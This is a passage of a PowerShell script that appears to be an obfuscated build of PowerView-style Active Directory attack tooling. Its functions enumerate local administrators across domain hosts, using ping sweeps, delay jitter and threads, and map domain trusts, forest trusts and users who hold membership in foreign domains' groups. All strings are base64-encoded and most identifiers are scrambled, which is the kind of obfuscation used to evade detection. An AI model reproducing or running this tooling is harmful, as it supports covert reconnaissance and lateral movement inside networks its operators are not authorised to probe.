            if (${___/==\___/=\_/\/} -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwALwBcAC8AXABfAF8ALwBcAF8AXwAvAFwAXwB9ACoA'))) -and ${/=\_/\_/\__/\_/\/} -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwAvAD0AXABfAF8AXwBfAF8AXwBfAF8ALwB9AA=='))) ) {                    
                $Null = ${_/=\/\_/\/\/=\_/=}.Rows.Add(${/===\/===\/=\__/\},${___/==\___/=\_/\/},${/=\_/\_/\__/\_/\/},${_/\___/\___/\/\_/},${_/=\_/===\_/=\__/},${/==\___/==\/=\___})
            }
        }
    }
    ${__/===\_/==\_/\__} = ${_/=\/\_/\/\/=\_/=} | select ComputerName -Unique | measure
    ${____/\/=\__/===\_} = ${__/===\_/==\_/\__}.Count
    if (${__/===\_/==\_/\__}.Count -gt 0) {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAG8AdQBuAGQAIAAkAHsAXwBfAF8AXwAvAFwALwA9AFwAXwBfAC8APQA9AD0AXABfAH0AIABwAG8AdABlAG4AdABpAGEAbABsAHkAIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcwB5AHMAdABlAG0AcwAhAA==')))
        ${_/=\/\_/\/\/=\_/=} | sort { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABOAG8AIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcwB5AHMAdABlAG0AcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgA=')))
    }
}
function Invoke-EnumerateLocalAdmin {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $TrustGroups,
        [Switch]
        $DomainOnly,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Switch]
        $API
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBFAG4AdQBtAGUAcgBhAHQAZQBMAG8AYwBhAGwAQQBkAG0AaQBuACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                ${__/==\/=\_/=\/\__} = @($Domain)
            }
            elseif($SearchForest) {
                ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
            }
            else {
                ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/).name )
            }
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += _/=\___/=\_______/ -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { rd -Path $OutFile }
        }
        if($TrustGroups) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAZQByAG0AaQBuAGkAbgBnACAAZABvAG0AYQBpAG4AIAB0AHIAdQBzAHQAIABnAHIAbwB1AHAAcwA=')))
            ${/=\/==\/==\/==\__} = _/=\_/=\__/=\__/=\ -Domain $Domain -DomainController $DomainController | % { $_.GroupName } | sort -Unique
            ${/=\/==\_____/====} = ${/=\/==\/==\/==\__} | % { 
                _____/\/===\/=\/== -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | ? { $_.objectsid -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))) } | % { $_.objectsid }
            }
            ${__/==\/===\___/==} = __/=\_/=\___/\_/== -Domain $Domain -DomainController $DomainController
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, $OutFile, ${__/==\/===\___/==}, ${/=\/==\_____/====}, $API, $DomainOnly)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                if($API) {
                    ${/====\_____/\_/\/} = __/\_/\/\_/\_/=\/\ -ComputerName $ComputerName -API
                }
                else {
                    ${/====\_____/\_/\/} = __/\_/\/\_/\_/=\/\ -ComputerName $ComputerName
                }
                if(${__/==\/===\___/==}) {
                    ${_/==\/=\_/\__/\_/} = (${/====\_____/\_/\/} | ? { $_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAAJAA='))) }).SID -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADAAMAAkAA==')))
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAFMAaQBkACAAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAOgAgACQAewBfAC8APQA9AFwALwA9AFwAXwAvAFwAXwBfAC8AXABfAC8AfQA=')))
                    ${/====\_____/\_/\/} = ${/====\_____/\_/\/} | ? { (${/=\/==\_____/====} -contains $_.SID) -or ((-not $_.SID.startsWith(${_/==\/=\_/\__/\_/})) -and (-not $_.SID.startsWith(${__/==\/===\___/==}))) }
                }
                if($DomainOnly) {
                    ${/====\_____/\_/\/} = ${/====\_____/\_/\/} | ? {$_.IsDomain}
                }
                if(${/====\_____/\_/\/} -and (${/====\_____/\_/\/}.Length -ne 0)) {
                    if($OutFile) {
                        ${/====\_____/\_/\/} | ______/\__/==\___/ -OutFile $OutFile
                    }
                    else {
                        ${/====\_____/\_/\/}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIAByAGUAdAB1AHIAbgBlAGQAIABmAHIAbwBtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = ${__/==\/===\___/==}
                'TrustGroupsSIDs' = ${/=\/==\_____/====}
            }
            if($API) {
                ${/\______/=\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $True
            }
            if($DomainOnly) {
                ${/\______/=\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATwBuAGwAeQA=')))] = $True
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                ${_/\_/\___/\/=\__/} = @(${___/==\/\/==\/=\/}, $False, $OutFile, ${__/==\/===\___/==}, ${/=\/==\_____/====}, $API, $DomainOnly)
                icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${_/\_/\___/\/=\__/}
            }
        }
    }
}
function __/=\/\_/\_/\_____ {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $API,
        [Switch]
        $LDAP,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${/==\/==\/=\_/\__/} = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAG4AXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAZQB2AGUAbABfAG8AbgBsAHkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB1AGEAcgBhAG4AdABpAG4AZQBkAF8AZABvAG0AYQBpAG4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAZQBzAHQAXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAHQAaABpAG4AXwBmAG8AcgBlAHMAdAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAYQB0AF8AYQBzAF8AZQB4AHQAZQByAG4AYQBsAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAHIAYwA0AF8AZQBuAGMAcgB5AHAAdABpAG8AbgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAGEAZQBzAF8AawBlAHkAcwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AXwBuAG8AXwB0AGcAdABfAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABpAG0AXwB0AHIAdQBzAHQA')))
        }
    }
    process {
        if(-not $Domain) {
            ${_/=\__/=\_/=\_/\_} = (______/====\/=\__/ -Credential $Credential).Name
        }
        else {
            ${_/=\__/=\_/=\_/\_} = $Domain
        }
        if($LDAP -or $ADSPath) {
            ${___/\____/\_/=\/=} = __/=====\_/\_/==== -Domain ${_/=\__/=\_/=\_/\_} -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADSpath $ADSpath
            ${_/==\_/\_/===\/==} = __/=\_/=\___/\_/== -Domain ${_/=\__/=\_/=\_/\_} -DomainController $DomainController
            if(${___/\____/\_/=\/=}) {
                ${___/\____/\_/=\/=}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                ${__/==\/===\/\/\/=} = ${___/\____/\_/=\/=}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    ${___/\/\/\/==\_/==} = $_.Properties
                    ${_/\/===\_/\/=\__/} = New-Object PSObject
                    ${/\_________/\___/} = @()
                    ${/\_________/\___/} += ${/==\/==\/=\_/\__/}.Keys | ? { ${___/\/\/\/==\_/==}.trustattributes[0] -band $_ } | % { ${/==\/==\/=\_/\__/}[$_] }
                    ${__/\/\__/=\___/\/} = Switch (${___/\/\/\/==\_/==}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${_/=\_/\/\/\/\/=\/} = New-Object Guid @(,${___/\/\/\/==\_/==}.objectguid[0])
                    ${___/===\_/====\__} = (New-Object System.Security.Principal.SecurityIdentifier(${___/\/\/\/==\_/==}.securityidentifier[0],0)).Value
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${_/=\__/=\_/=\_/\_}
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUAUwBJAEQA'))) ${_/==\_/\_/===\/==}
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${___/\/\/\/==\_/==}.name[0]
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBJAEQA'))) ${___/===\_/====\__}
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARwB1AGkAZAA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAkAHsAXwAvAD0AXABfAC8AXAAvAFwALwBcAC8AXAAvAD0AXAAvAH0AfQA=')))
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $(${/\_________/\___/} -join ',')
                    ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwALwBcAF8AXwAvAD0AXABfAF8AXwAvAFwALwB9AA==')))
                    ${_/\/===\_/\/=\__/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQATABEAEEAUAA='))))
                    ${_/\/===\_/\/=\__/}
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${___/\____/\_/=\/=}.dispose()
            }
        }
        elseif($API) {
            if(-not $DomainController) {
                $DomainController = __/=\____/=\/=\__/ -Credential $Credential -Domain ${_/=\__/=\_/=\_/\_} | select -First 1 | select -ExpandProperty Name
            }
            if($DomainController) {
                ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
                ${/=\______/=\__/\/} = 63
                ${/=\___/=\__/===\/} = 0
                ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::DsEnumerateDomainTrusts($DomainController, ${/=\______/=\__/\/}, [ref]${___/\/\/\_/\__/=\}, [ref]${/=\___/=\__/===\/})
                ${___/\____/====\/=\} = ${___/\/\/\_/\__/=\}.ToInt64()
                if ((${__/\/\_/\___/=\__} -eq 0) -and (${___/\____/====\/=\} -gt 0)) {
                    ${/=\_/=\_/\/=\_/\/} = ${/=\/\/\/==\/=\___}::GetSize()
                    for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${/=\___/=\__/===\/}); ${__/==\/=\_/=\/==\}++) {
                        ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
                        ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${/=\/\/\/==\/=\___}
                        ${___/\____/====\/=\} = ${_/====\__/\__/\/\}.ToInt64()
                        ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
                        ${___/====\___/\___} = ""
                        ${__/\/\_/\___/=\__} = ${__/==\__/\_/\/\/=}::ConvertSidToStringSid(${___/=\_/==\_/\__/}.DomainSid, [ref]${___/====\___/\___});${____/\/\/=\/\_/\/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if(${__/\/\_/\___/=\__} -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${____/\/\/=\/\_/\/}).Message)"
                        }
                        else {
                            ${_/\/===\_/\/=\__/} = New-Object PSObject
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUARABvAG0AYQBpAG4A'))) ${_/=\__/=\_/=\_/\_}
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA='))) $DomainController
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAYgBpAG8AcwBEAG8AbQBhAGkAbgBOAGEAbQBlAA=='))) ${___/=\_/==\_/\__/}.NetbiosDomainName
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABuAHMARABvAG0AYQBpAG4ATgBhAG0AZQA='))) ${___/=\_/==\_/\__/}.DnsDomainName
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) ${___/=\_/==\_/\__/}.Flags
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) ${___/=\_/==\_/\__/}.ParentIndex
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${___/=\_/==\_/\__/}.TrustType
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) ${___/=\_/==\_/\__/}.TrustAttributes
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAGQA'))) ${___/====\___/\___}
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ARwB1AGkAZAA='))) ${___/=\_/==\_/\__/}.DomainGuid
                            ${_/\/===\_/\/=\__/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAFAASQBEAG8AbQBhAGkAbgBUAHIAdQBzAHQA'))))
                            ${_/\/===\_/\/=\__/}
                        }
                    }
                    $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
                }
                else {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
                }
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAGMAbwBuAHQAcgBvAGwAbABlAHIAIABmAG8AcgAgACQARABvAG0AYQBpAG4A')))
            }
        }
        else {
            ${_/====\/=\___/===} = ______/====\/=\__/ -Domain $Domain -Credential $Credential
            if(${_/====\/=\___/===}) {
                ${_/====\/=\___/===}.GetAllTrustRelationships() | % {
                    $_.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQA'))))
                    $_
                }
            }
        }
    }
}
function _/==\/\/\_/=\_/\_/ {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        ${__/\_/\/=\/==\/=\} = ___/\____/\/\_/\__ -Forest $Forest -Credential $Credential
        if(${__/\_/\/=\/==\/=\}) {
            ${__/\_/\/=\/==\/=\}.GetAllTrustRelationships() | % {
                $_.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQA'))))
                $_
            }
        }
    }
}
function Find-ForeignUser {
    [CmdletBinding()]
    param(
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function _/=\/\_/===\_/=\__ {
        param(
            [String]
            $UserName,
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if ($Domain) {
            ${__/=\/=\_/\/\____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))) + $Domain -replace '\.',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))
        }
        else {
            ${__/=\/=\_/\/\____} = [String] ([adsi]'').distinguishedname
            $Domain = ${__/=\/=\_/\/\____} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
        }
        __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize -Filter '(memberof=*)' | % {
            ForEach (${_/\___/==\/=====\} in $_.memberof) {
                ${/=\/\__/=\/\/\_/=} = ${_/\___/==\/=====\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if(${/=\/\__/=\/\/\_/=}) {
                    ${_/====\_____/\_/=} = $(${_/\___/==\/=====\}.substring(${/=\/\__/=\/\/\_/=})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${_/====\_____/\_/=}.CompareTo($Domain)) {
                        $GroupName = ${_/\___/==\/=====\}.split(",")[0].split("=")[1]
                        ${_/\/\__/=\_/\_/\_} = New-Object PSObject
                        ${_/\/\__/=\_/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Domain
                        ${_/\/\__/=\_/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${_/\/\__/=\_/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${_/====\_____/\_/=}
                        ${_/\/\__/=\_/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        ${_/\/\__/=\_/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) ${_/\___/==\/=====\}
                        ${_/\/\__/=\_/\_/\_}
                    }
                }
            }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            ${_/===\/====\/\__/} = __/\_/==\/=\_/\_/\ -LDAP -DomainController $DomainController -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        else {
            ${_/===\/====\/\__/} = __/\_/==\/=\_/\_/\ -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        ForEach(${_/\/===\_/\/=\__/} in ${_/===\/====\/\__/}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0ACAAZwByAG8AdQBwAHMAIABpAG4AIABkAG8AbQBhAGkAbgAgACQAewBfAC8AXAAvAD0APQA9AFwAXwAvAFwALwA9AFwAXwBfAC8AfQA=')))
            _/=\/\_/===\_/=\__ -Domain ${_/\/===\_/\/=\__/} -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        _/=\/\_/===\_/=\__ -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}
function _/=\_/=\__/=\__/=\ {
    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function ___/\_/\/==\/=\/\_ {
        param(
            [String]
            $GroupName = '*',
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if(-not $Domain) {
            $Domain = (______/====\/=\__/).Name
        }
        ${/==\/=\/\__/\_/==} = "DC=$($Domain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ARABOADoAIAAkAHsALwA9AD0AXAAvAD0AXAAvAFwAXwBfAC8AXABfAC8APQA9AH0A')))
        ${___/\__/====\/\/\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
